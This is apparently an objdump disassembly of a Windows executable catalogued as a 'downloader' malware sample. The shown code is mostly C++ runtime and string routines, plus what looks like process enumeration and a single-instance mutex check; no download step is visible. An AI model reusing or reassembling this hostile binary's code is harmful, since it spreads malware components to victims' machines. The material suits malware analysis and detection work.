
malware_samples/downloader/b72acf4b6a14655e8583b209b60c2bf0177af1e40ffa4765523cd9bbbad48451.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 05 61 d3 00 00 	lea    0xd361(%rip),%rax        # 0x14000e368
   140001007:	48 89 01             	mov    %rax,(%rcx)
   14000100a:	e9 79 0b 00 00       	jmp    0x140001b88
   14000100f:	cc                   	int3
   140001010:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001015:	57                   	push   %rdi
   140001016:	48 83 ec 20          	sub    $0x20,%rsp
   14000101a:	48 8d 05 47 d3 00 00 	lea    0xd347(%rip),%rax        # 0x14000e368
   140001021:	8b da                	mov    %edx,%ebx
   140001023:	48 8b f9             	mov    %rcx,%rdi
   140001026:	48 89 01             	mov    %rax,(%rcx)
   140001029:	e8 5a 0b 00 00       	call   0x140001b88
   14000102e:	f6 c3 01             	test   $0x1,%bl
   140001031:	74 08                	je     0x14000103b
   140001033:	48 8b cf             	mov    %rdi,%rcx
   140001036:	e8 b5 0b 00 00       	call   0x140001bf0
   14000103b:	48 8b c7             	mov    %rdi,%rax
   14000103e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001043:	48 83 c4 20          	add    $0x20,%rsp
   140001047:	5f                   	pop    %rdi
   140001048:	c3                   	ret
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 81 ec b8 06 00 00 	sub    $0x6b8,%rsp
   140001057:	48 c7 44 24 38 fe ff 	movq   $0xfffffffffffffffe,0x38(%rsp)
   14000105e:	ff ff 
   140001060:	48 8b 05 e1 1f 01 00 	mov    0x11fe1(%rip),%rax        # 0x140013048
   140001067:	48 33 c4             	xor    %rsp,%rax
   14000106a:	48 89 84 24 a0 06 00 	mov    %rax,0x6a0(%rsp)
   140001071:	00 
   140001072:	c7 44 24 30 2c 00 00 	movl   $0x2c,0x30(%rsp)
   140001079:	00 
   14000107a:	48 8d 15 5f 07 01 00 	lea    0x1075f(%rip),%rdx        # 0x1400117e0
   140001081:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001086:	e8 75 23 00 00       	call   0x140003400
   14000108b:	cc                   	int3
   14000108c:	cc                   	int3
   14000108d:	cc                   	int3
   14000108e:	cc                   	int3
   14000108f:	cc                   	int3
   140001090:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001095:	55                   	push   %rbp
   140001096:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   14000109d:	48 8b 05 a4 1f 01 00 	mov    0x11fa4(%rip),%rax        # 0x140013048
   1400010a4:	48 33 c4             	xor    %rsp,%rax
   1400010a7:	48 89 84 24 50 01 00 	mov    %rax,0x150(%rsp)
   1400010ae:	00 
   1400010af:	33 ed                	xor    %ebp,%ebp
   1400010b1:	33 d2                	xor    %edx,%edx
   1400010b3:	8d 4d 02             	lea    0x2(%rbp),%ecx
   1400010b6:	e8 57 09 00 00       	call   0x140001a12
   1400010bb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400010c0:	c7 44 24 20 30 01 00 	movl   $0x130,0x20(%rsp)
   1400010c7:	00 
   1400010c8:	48 8b c8             	mov    %rax,%rcx
   1400010cb:	48 8b d8             	mov    %rax,%rbx
   1400010ce:	e8 45 09 00 00       	call   0x140001a18
   1400010d3:	85 c0                	test   %eax,%eax
   1400010d5:	74 78                	je     0x14000114f
   1400010d7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400010dc:	48 8b cb             	mov    %rbx,%rcx
   1400010df:	c7 44 24 20 30 01 00 	movl   $0x130,0x20(%rsp)
   1400010e6:	00 
   1400010e7:	e8 32 09 00 00       	call   0x140001a1e
   1400010ec:	85 c0                	test   %eax,%eax
   1400010ee:	74 54                	je     0x140001144
   1400010f0:	48 89 b4 24 70 01 00 	mov    %rsi,0x170(%rsp)
   1400010f7:	00 
   1400010f8:	48 89 bc 24 78 01 00 	mov    %rdi,0x178(%rsp)
   1400010ff:	00 
   140001100:	48 8d 74 24 4c       	lea    0x4c(%rsp),%rsi
   140001105:	48 8d 3d c4 f1 00 00 	lea    0xf1c4(%rip),%rdi        # 0x1400102d0
   14000110c:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140001111:	f3 a6                	repz cmpsb (%rdi),(%rsi)
   140001113:	74 1b                	je     0x140001130
   140001115:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000111a:	48 8b cb             	mov    %rbx,%rcx
   14000111d:	c7 44 24 20 30 01 00 	movl   $0x130,0x20(%rsp)
   140001124:	00 
   140001125:	e8 f4 08 00 00       	call   0x140001a1e
   14000112a:	85 c0                	test   %eax,%eax
   14000112c:	75 d2                	jne    0x140001100
   14000112e:	eb 04                	jmp    0x140001134
   140001130:	8b 6c 24 28          	mov    0x28(%rsp),%ebp
   140001134:	48 8b b4 24 70 01 00 	mov    0x170(%rsp),%rsi
   14000113b:	00 
   14000113c:	48 8b bc 24 78 01 00 	mov    0x178(%rsp),%rdi
   140001143:	00 
   140001144:	48 8b cb             	mov    %rbx,%rcx
   140001147:	ff 15 f3 ce 00 00    	call   *0xcef3(%rip)        # 0x14000e040
   14000114d:	8b c5                	mov    %ebp,%eax
   14000114f:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   140001156:	00 
   140001157:	48 33 cc             	xor    %rsp,%rcx
   14000115a:	e8 e1 08 00 00       	call   0x140001a40
   14000115f:	48 8b 9c 24 80 01 00 	mov    0x180(%rsp),%rbx
   140001166:	00 
   140001167:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   14000116e:	5d                   	pop    %rbp
   14000116f:	c3                   	ret
   140001170:	48 83 ec 28          	sub    $0x28,%rsp
   140001174:	48 8d 0d 55 f1 00 00 	lea    0xf155(%rip),%rcx        # 0x1400102d0
   14000117b:	e8 10 ff ff ff       	call   0x140001090
   140001180:	85 c0                	test   %eax,%eax
   140001182:	74 08                	je     0x14000118c
   140001184:	33 c9                	xor    %ecx,%ecx
   140001186:	e8 41 11 00 00       	call   0x1400022cc
   14000118b:	cc                   	int3
   14000118c:	4c 8d 05 4d f1 00 00 	lea    0xf14d(%rip),%r8        # 0x1400102e0
   140001193:	33 d2                	xor    %edx,%edx
   140001195:	33 c9                	xor    %ecx,%ecx
   140001197:	ff 15 ab ce 00 00    	call   *0xceab(%rip)        # 0x14000e048
   14000119d:	ff 15 ad ce 00 00    	call   *0xcead(%rip)        # 0x14000e050
   1400011a3:	3d b7 00 00 00       	cmp    $0xb7,%eax
   1400011a8:	75 07                	jne    0x1400011b1
   1400011aa:	33 c0                	xor    %eax,%eax
   1400011ac:	48 83 c4 28          	add    $0x28,%rsp
   1400011b0:	c3                   	ret
   1400011b1:	e8 9a fe ff ff       	call   0x140001050
   1400011b6:	cc                   	int3
   1400011b7:	cc                   	int3
   1400011b8:	cc                   	int3
   1400011b9:	cc                   	int3
   1400011ba:	cc                   	int3
   1400011bb:	cc                   	int3
   1400011bc:	cc                   	int3
   1400011bd:	cc                   	int3
   1400011be:	cc                   	int3
   1400011bf:	cc                   	int3
   1400011c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400011c5:	57                   	push   %rdi
   1400011c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011ca:	48 c7 41 20 0f 00 00 	movq   $0xf,0x20(%rcx)
   1400011d1:	00 
   1400011d2:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   1400011d9:	00 
   1400011da:	48 8b d9             	mov    %rcx,%rbx
   1400011dd:	c6 41 08 00          	movb   $0x0,0x8(%rcx)
   1400011e1:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400011e5:	33 c0                	xor    %eax,%eax
   1400011e7:	48 8b fa             	mov    %rdx,%rdi
   1400011ea:	f2 ae                	repnz scas (%rdi),%al
   1400011ec:	48 f7 d1             	not    %rcx
   1400011ef:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   1400011f3:	48 8b cb             	mov    %rbx,%rcx
   1400011f6:	e8 e5 02 00 00       	call   0x1400014e0
   1400011fb:	48 8b c3             	mov    %rbx,%rax
   1400011fe:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001203:	48 83 c4 20          	add    $0x20,%rsp
   140001207:	5f                   	pop    %rdi
   140001208:	c3                   	ret
   140001209:	cc                   	int3
   14000120a:	cc                   	int3
   14000120b:	cc                   	int3
   14000120c:	cc                   	int3
   14000120d:	cc                   	int3
   14000120e:	cc                   	int3
   14000120f:	cc                   	int3
   140001210:	40 53                	rex push %rbx
   140001212:	48 83 ec 20          	sub    $0x20,%rsp
   140001216:	48 83 79 20 10       	cmpq   $0x10,0x20(%rcx)
   14000121b:	48 8b d9             	mov    %rcx,%rbx
   14000121e:	72 09                	jb     0x140001229
   140001220:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001224:	e8 c7 09 00 00       	call   0x140001bf0
   140001229:	48 c7 43 20 0f 00 00 	movq   $0xf,0x20(%rbx)
   140001230:	00 
   140001231:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
   140001238:	00 
   140001239:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   14000123d:	48 83 c4 20          	add    $0x20,%rsp
   140001241:	5b                   	pop    %rbx
   140001242:	c3                   	ret
   140001243:	cc                   	int3
   140001244:	cc                   	int3
   140001245:	cc                   	int3
   140001246:	cc                   	int3
   140001247:	cc                   	int3
   140001248:	cc                   	int3
   140001249:	cc                   	int3
   14000124a:	cc                   	int3
   14000124b:	cc                   	int3
   14000124c:	cc                   	int3
   14000124d:	cc                   	int3
   14000124e:	cc                   	int3
   14000124f:	cc                   	int3
   140001250:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001255:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000125a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000125f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001264:	41 54                	push   %r12
   140001266:	48 83 ec 20          	sub    $0x20,%rsp
   14000126a:	4d 8b e1             	mov    %r9,%r12
   14000126d:	49 8b e8             	mov    %r8,%rbp
   140001270:	48 8b f2             	mov    %rdx,%rsi
   140001273:	48 8b d9             	mov    %rcx,%rbx
   140001276:	4c 39 42 18          	cmp    %r8,0x18(%rdx)
   14000127a:	73 05                	jae    0x140001281
   14000127c:	e8 5b 91 00 00       	call   0x14000a3dc
   140001281:	48 8b 7e 18          	mov    0x18(%rsi),%rdi
   140001285:	48 2b fd             	sub    %rbp,%rdi
   140001288:	4c 3b e7             	cmp    %rdi,%r12
   14000128b:	49 0f 42 fc          	cmovb  %r12,%rdi
   14000128f:	48 3b de             	cmp    %rsi,%rbx
   140001292:	75 22                	jne    0x1400012b6
   140001294:	48 8d 14 2f          	lea    (%rdi,%rbp,1),%rdx
   140001298:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   14000129c:	48 8b cb             	mov    %rbx,%rcx
   14000129f:	e8 8c 03 00 00       	call   0x140001630
   1400012a4:	4c 8b c5             	mov    %rbp,%r8
   1400012a7:	33 d2                	xor    %edx,%edx
   1400012a9:	48 8b cb             	mov    %rbx,%rcx
   1400012ac:	e8 7f 03 00 00       	call   0x140001630
   1400012b1:	e9 8e 00 00 00       	jmp    0x140001344
   1400012b6:	48 83 ff fe          	cmp    $0xfffffffffffffffe,%rdi
   1400012ba:	76 05                	jbe    0x1400012c1
   1400012bc:	e8 b3 90 00 00       	call   0x14000a374
   1400012c1:	48 8b 43 20          	mov    0x20(%rbx),%rax
   1400012c5:	48 3b c7             	cmp    %rdi,%rax
   1400012c8:	73 21                	jae    0x1400012eb
   1400012ca:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   1400012ce:	48 8b d7             	mov    %rdi,%rdx
   1400012d1:	48 8b cb             	mov    %rbx,%rcx
   1400012d4:	e8 47 05 00 00       	call   0x140001820
   1400012d9:	48 85 ff             	test   %rdi,%rdi
   1400012dc:	74 66                	je     0x140001344
   1400012de:	48 83 7e 20 10       	cmpq   $0x10,0x20(%rsi)
   1400012e3:	72 27                	jb     0x14000130c
   1400012e5:	48 8b 46 08          	mov    0x8(%rsi),%rax
   1400012e9:	eb 25                	jmp    0x140001310
   1400012eb:	48 85 ff             	test   %rdi,%rdi
   1400012ee:	75 ee                	jne    0x1400012de
   1400012f0:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   1400012f4:	48 83 f8 10          	cmp    $0x10,%rax
   1400012f8:	72 09                	jb     0x140001303
   1400012fa:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400012fe:	40 88 38             	mov    %dil,(%rax)
   140001301:	eb 41                	jmp    0x140001344
   140001303:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140001307:	c6 00 00             	movb   $0x0,(%rax)
   14000130a:	eb 38                	jmp    0x140001344
   14000130c:	48 8d 46 08          	lea    0x8(%rsi),%rax
   140001310:	48 8b 53 20          	mov    0x20(%rbx),%rdx
   140001314:	48 8d 73 08          	lea    0x8(%rbx),%rsi
   140001318:	48 83 fa 10          	cmp    $0x10,%rdx
   14000131c:	72 05                	jb     0x140001323
   14000131e:	48 8b 0e             	mov    (%rsi),%rcx
   140001321:	eb 03                	jmp    0x140001326
   140001323:	48 8b ce             	mov    %rsi,%rcx
   140001326:	4c 8d 04 28          	lea    (%rax,%rbp,1),%r8
   14000132a:	4c 8b cf             	mov    %rdi,%r9
   14000132d:	e8 c6 08 00 00       	call   0x140001bf8
   140001332:	48 83 7b 20 10       	cmpq   $0x10,0x20(%rbx)
   140001337:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   14000133b:	72 03                	jb     0x140001340
   14000133d:	48 8b 36             	mov    (%rsi),%rsi
   140001340:	c6 04 3e 00          	movb   $0x0,(%rsi,%rdi,1)
   140001344:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001349:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000134e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140001353:	48 8b c3             	mov    %rbx,%rax
   140001356:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000135b:	48 83 c4 20          	add    $0x20,%rsp
   14000135f:	41 5c                	pop    %r12
   140001361:	c3                   	ret
   140001362:	cc                   	int3
   140001363:	cc                   	int3
   140001364:	cc                   	int3
   140001365:	cc                   	int3
   140001366:	cc                   	int3
   140001367:	cc                   	int3
   140001368:	cc                   	int3
   140001369:	cc                   	int3
   14000136a:	cc                   	int3
   14000136b:	cc                   	int3
   14000136c:	cc                   	int3
   14000136d:	cc                   	int3
   14000136e:	cc                   	int3
   14000136f:	cc                   	int3
   140001370:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001375:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000137a:	41 54                	push   %r12
   14000137c:	48 83 ec 20          	sub    $0x20,%rsp
   140001380:	49 8b e8             	mov    %r8,%rbp
   140001383:	4c 8b e2             	mov    %rdx,%r12
   140001386:	48 8b d9             	mov    %rcx,%rbx
   140001389:	48 85 d2             	test   %rdx,%rdx
   14000138c:	74 64                	je     0x1400013f2
   14000138e:	4c 8b 41 20          	mov    0x20(%rcx),%r8
   140001392:	49 83 f8 10          	cmp    $0x10,%r8
   140001396:	72 0a                	jb     0x1400013a2
   140001398:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000139c:	4c 8d 49 08          	lea    0x8(%rcx),%r9
   1400013a0:	eb 07                	jmp    0x1400013a9
   1400013a2:	4c 8d 49 08          	lea    0x8(%rcx),%r9
   1400013a6:	49 8b c1             	mov    %r9,%rax
   1400013a9:	48 3b d0             	cmp    %rax,%rdx
   1400013ac:	72 44                	jb     0x1400013f2
   1400013ae:	49 83 f8 10          	cmp    $0x10,%r8
   1400013b2:	72 05                	jb     0x1400013b9
   1400013b4:	49 8b 09             	mov    (%r9),%rcx
   1400013b7:	eb 03                	jmp    0x1400013bc
   1400013b9:	49 8b c9             	mov    %r9,%rcx
   1400013bc:	48 03 4b 18          	add    0x18(%rbx),%rcx
   1400013c0:	48 3b ca             	cmp    %rdx,%rcx
   1400013c3:	76 2d                	jbe    0x1400013f2
   1400013c5:	49 83 f8 10          	cmp    $0x10,%r8
   1400013c9:	72 03                	jb     0x1400013ce
   1400013cb:	4d 8b 09             	mov    (%r9),%r9
   1400013ce:	4d 2b e1             	sub    %r9,%r12
   1400013d1:	48 8b d3             	mov    %rbx,%rdx
   1400013d4:	48 8b cb             	mov    %rbx,%rcx
   1400013d7:	4d 8b c4             	mov    %r12,%r8
   1400013da:	4c 8b cd             	mov    %rbp,%r9
   1400013dd:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400013e2:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400013e7:	48 83 c4 20          	add    $0x20,%rsp
   1400013eb:	41 5c                	pop    %r12
   1400013ed:	e9 ee 02 00 00       	jmp    0x1400016e0
   1400013f2:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   1400013f6:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400013fa:	48 2b c1             	sub    %rcx,%rax
   1400013fd:	48 3b c5             	cmp    %rbp,%rax
   140001400:	76 09                	jbe    0x14000140b
   140001402:	48 8d 04 29          	lea    (%rcx,%rbp,1),%rax
   140001406:	48 3b c1             	cmp    %rcx,%rax
   140001409:	73 05                	jae    0x140001410
   14000140b:	e8 64 8f 00 00       	call   0x14000a374
   140001410:	48 85 ed             	test   %rbp,%rbp
   140001413:	0f 84 a6 00 00 00    	je     0x1400014bf
   140001419:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000141e:	48 8b 7b 18          	mov    0x18(%rbx),%rdi
   140001422:	48 03 fd             	add    %rbp,%rdi
   140001425:	48 83 ff fe          	cmp    $0xfffffffffffffffe,%rdi
   140001429:	76 05                	jbe    0x140001430
   14000142b:	e8 44 8f 00 00       	call   0x14000a374
   140001430:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140001434:	48 3b c7             	cmp    %rdi,%rax
   140001437:	73 2d                	jae    0x140001466
   140001439:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   14000143d:	48 8b d7             	mov    %rdi,%rdx
   140001440:	48 8b cb             	mov    %rbx,%rcx
   140001443:	e8 d8 03 00 00       	call   0x140001820
   140001448:	48 85 ff             	test   %rdi,%rdi
   14000144b:	74 6d                	je     0x1400014ba
   14000144d:	48 8b 53 20          	mov    0x20(%rbx),%rdx
   140001451:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001456:	48 83 fa 10          	cmp    $0x10,%rdx
   14000145a:	72 2b                	jb     0x140001487
   14000145c:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001460:	48 8d 73 08          	lea    0x8(%rbx),%rsi
   140001464:	eb 28                	jmp    0x14000148e
   140001466:	48 85 ff             	test   %rdi,%rdi
   140001469:	75 dd                	jne    0x140001448
   14000146b:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   14000146f:	48 83 f8 10          	cmp    $0x10,%rax
   140001473:	72 09                	jb     0x14000147e
   140001475:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140001479:	40 88 38             	mov    %dil,(%rax)
   14000147c:	eb 3c                	jmp    0x1400014ba
   14000147e:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140001482:	c6 00 00             	movb   $0x0,(%rax)
   140001485:	eb 33                	jmp    0x1400014ba
   140001487:	48 8d 73 08          	lea    0x8(%rbx),%rsi
   14000148b:	48 8b ce             	mov    %rsi,%rcx
   14000148e:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140001492:	4c 8b cd             	mov    %rbp,%r9
   140001495:	4d 8b c4             	mov    %r12,%r8
   140001498:	48 2b d0             	sub    %rax,%rdx
   14000149b:	48 03 c8             	add    %rax,%rcx
   14000149e:	e8 55 07 00 00       	call   0x140001bf8
   1400014a3:	48 83 7b 20 10       	cmpq   $0x10,0x20(%rbx)
   1400014a8:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   1400014ac:	72 03                	jb     0x1400014b1
   1400014ae:	48 8b 36             	mov    (%rsi),%rsi
   1400014b1:	c6 04 3e 00          	movb   $0x0,(%rsi,%rdi,1)
   1400014b5:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400014ba:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   1400014bf:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400014c4:	48 8b c3             	mov    %rbx,%rax
   1400014c7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400014cc:	48 83 c4 20          	add    $0x20,%rsp
   1400014d0:	41 5c                	pop    %r12
   1400014d2:	c3                   	ret
   1400014d3:	cc                   	int3
   1400014d4:	cc                   	int3
   1400014d5:	cc                   	int3
   1400014d6:	cc                   	int3
   1400014d7:	cc                   	int3
   1400014d8:	cc                   	int3
   1400014d9:	cc                   	int3
   1400014da:	cc                   	int3
   1400014db:	cc                   	int3
   1400014dc:	cc                   	int3
   1400014dd:	cc                   	int3
   1400014de:	cc                   	int3
   1400014df:	cc                   	int3
   1400014e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400014e5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400014ea:	56                   	push   %rsi
   1400014eb:	48 83 ec 20          	sub    $0x20,%rsp
   1400014ef:	49 8b f0             	mov    %r8,%rsi
   1400014f2:	48 8b ea             	mov    %rdx,%rbp
   1400014f5:	48 8b d9             	mov    %rcx,%rbx
   1400014f8:	48 85 d2             	test   %rdx,%rdx
   1400014fb:	74 63                	je     0x140001560
   1400014fd:	4c 8b 41 20          	mov    0x20(%rcx),%r8
   140001501:	49 83 f8 10          	cmp    $0x10,%r8
   140001505:	72 0a                	jb     0x140001511
   140001507:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000150b:	4c 8d 49 08          	lea    0x8(%rcx),%r9
   14000150f:	eb 07                	jmp    0x140001518
   140001511:	4c 8d 49 08          	lea    0x8(%rcx),%r9
   140001515:	49 8b c1             	mov    %r9,%rax
   140001518:	48 3b d0             	cmp    %rax,%rdx
   14000151b:	72 43                	jb     0x140001560
   14000151d:	49 83 f8 10          	cmp    $0x10,%r8
   140001521:	72 05                	jb     0x140001528
   140001523:	49 8b 09             	mov    (%r9),%rcx
   140001526:	eb 03                	jmp    0x14000152b
   140001528:	49 8b c9             	mov    %r9,%rcx
   14000152b:	48 03 4b 18          	add    0x18(%rbx),%rcx
   14000152f:	48 3b ca             	cmp    %rdx,%rcx
   140001532:	76 2c                	jbe    0x140001560
   140001534:	49 83 f8 10          	cmp    $0x10,%r8
   140001538:	72 03                	jb     0x14000153d
   14000153a:	4d 8b 09             	mov    (%r9),%r9
   14000153d:	49 2b e9             	sub    %r9,%rbp
   140001540:	48 8b d3             	mov    %rbx,%rdx
   140001543:	48 8b cb             	mov    %rbx,%rcx
   140001546:	4c 8b c5             	mov    %rbp,%r8
   140001549:	4c 8b ce             	mov    %rsi,%r9
   14000154c:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001551:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140001556:	48 83 c4 20          	add    $0x20,%rsp
   14000155a:	5e                   	pop    %rsi
   14000155b:	e9 f0 fc ff ff       	jmp    0x140001250
   140001560:	48 83 fe fe          	cmp    $0xfffffffffffffffe,%rsi
   140001564:	76 05                	jbe    0x14000156b
   140001566:	e8 09 8e 00 00       	call   0x14000a374
   14000156b:	48 8b 43 20          	mov    0x20(%rbx),%rax
   14000156f:	48 3b c6             	cmp    %rsi,%rax
   140001572:	73 31                	jae    0x1400015a5
   140001574:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140001578:	48 8b d6             	mov    %rsi,%rdx
   14000157b:	48 8b cb             	mov    %rbx,%rcx
   14000157e:	e8 9d 02 00 00       	call   0x140001820
   140001583:	48 85 f6             	test   %rsi,%rsi
   140001586:	0f 84 85 00 00 00    	je     0x140001611
   14000158c:	48 8b 53 20          	mov    0x20(%rbx),%rdx
   140001590:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001595:	48 83 fa 10          	cmp    $0x10,%rdx
   140001599:	72 4d                	jb     0x1400015e8
   14000159b:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000159f:	48 8d 7b 08          	lea    0x8(%rbx),%rdi
   1400015a3:	eb 4a                	jmp    0x1400015ef
   1400015a5:	48 85 f6             	test   %rsi,%rsi
   1400015a8:	75 d9                	jne    0x140001583
   1400015aa:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   1400015ae:	48 83 f8 10          	cmp    $0x10,%rax
   1400015b2:	72 1a                	jb     0x1400015ce
   1400015b4:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400015b8:	40 88 30             	mov    %sil,(%rax)
   1400015bb:	48 8b c3             	mov    %rbx,%rax
   1400015be:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400015c3:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400015c8:	48 83 c4 20          	add    $0x20,%rsp
   1400015cc:	5e                   	pop    %rsi
   1400015cd:	c3                   	ret
   1400015ce:	48 8d 43 08          	lea    0x8(%rbx),%rax
   1400015d2:	c6 00 00             	movb   $0x0,(%rax)
   1400015d5:	48 8b c3             	mov    %rbx,%rax
   1400015d8:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400015dd:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400015e2:	48 83 c4 20          	add    $0x20,%rsp
   1400015e6:	5e                   	pop    %rsi
   1400015e7:	c3                   	ret
   1400015e8:	48 8d 7b 08          	lea    0x8(%rbx),%rdi
   1400015ec:	48 8b cf             	mov    %rdi,%rcx
   1400015ef:	4c 8b ce             	mov    %rsi,%r9
   1400015f2:	4c 8b c5             	mov    %rbp,%r8
   1400015f5:	e8 fe 05 00 00       	call   0x140001bf8
   1400015fa:	48 83 7b 20 10       	cmpq   $0x10,0x20(%rbx)
   1400015ff:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   140001603:	72 03                	jb     0x140001608
   140001605:	48 8b 3f             	mov    (%rdi),%rdi
   140001608:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   14000160c:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140001611:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140001616:	48 8b c3             	mov    %rbx,%rax
   140001619:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000161e:	48 83 c4 20          	add    $0x20,%rsp
   140001622:	5e                   	pop    %rsi
   140001623:	c3                   	ret
   140001624:	cc                   	int3
   140001625:	cc                   	int3
   140001626:	cc                   	int3
   140001627:	cc                   	int3
   140001628:	cc                   	int3
   140001629:	cc                   	int3
   14000162a:	cc                   	int3
   14000162b:	cc                   	int3
   14000162c:	cc                   	int3
   14000162d:	cc                   	int3
   14000162e:	cc                   	int3
   14000162f:	cc                   	int3
   140001630:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140001635:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000163a:	57                   	push   %rdi
   14000163b:	48 83 ec 20          	sub    $0x20,%rsp
   14000163f:	49 8b f0             	mov    %r8,%rsi
   140001642:	48 8b ea             	mov    %rdx,%rbp
   140001645:	48 8b f9             	mov    %rcx,%rdi
   140001648:	48 39 51 18          	cmp    %rdx,0x18(%rcx)
   14000164c:	73 05                	jae    0x140001653
   14000164e:	e8 89 8d 00 00       	call   0x14000a3dc
   140001653:	4c 8b 4f 18          	mov    0x18(%rdi),%r9
   140001657:	4c 2b cd             	sub    %rbp,%r9
   14000165a:	4c 3b ce             	cmp    %rsi,%r9
   14000165d:	49 0f 42 f1          	cmovb  %r9,%rsi
   140001661:	48 85 f6             	test   %rsi,%rsi
   140001664:	74 63                	je     0x1400016c9
   140001666:	48 8b 57 20          	mov    0x20(%rdi),%rdx
   14000166a:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000166f:	48 83 fa 10          	cmp    $0x10,%rdx
   140001673:	72 0a                	jb     0x14000167f
   140001675:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001679:	48 8d 5f 08          	lea    0x8(%rdi),%rbx
   14000167d:	eb 07                	jmp    0x140001686
   14000167f:	48 8d 5f 08          	lea    0x8(%rdi),%rbx
   140001683:	48 8b cb             	mov    %rbx,%rcx
   140001686:	48 83 fa 10          	cmp    $0x10,%rdx
   14000168a:	72 05                	jb     0x140001691
   14000168c:	48 8b 03             	mov    (%rbx),%rax
   14000168f:	eb 03                	jmp    0x140001694
   140001691:	48 8b c3             	mov    %rbx,%rax
   140001694:	4c 8d 04 29          	lea    (%rcx,%rbp,1),%r8
   140001698:	48 8d 0c 28          	lea    (%rax,%rbp,1),%rcx
   14000169c:	4c 2b ce             	sub    %rsi,%r9
   14000169f:	4c 03 c6             	add    %rsi,%r8
   1400016a2:	48 2b d5             	sub    %rbp,%rdx
   1400016a5:	e8 e6 05 00 00       	call   0x140001c90
   1400016aa:	4c 8b 5f 18          	mov    0x18(%rdi),%r11
   1400016ae:	4c 2b de             	sub    %rsi,%r11
   1400016b1:	48 83 7f 20 10       	cmpq   $0x10,0x20(%rdi)
   1400016b6:	4c 89 5f 18          	mov    %r11,0x18(%rdi)
   1400016ba:	72 03                	jb     0x1400016bf
   1400016bc:	48 8b 1b             	mov    (%rbx),%rbx
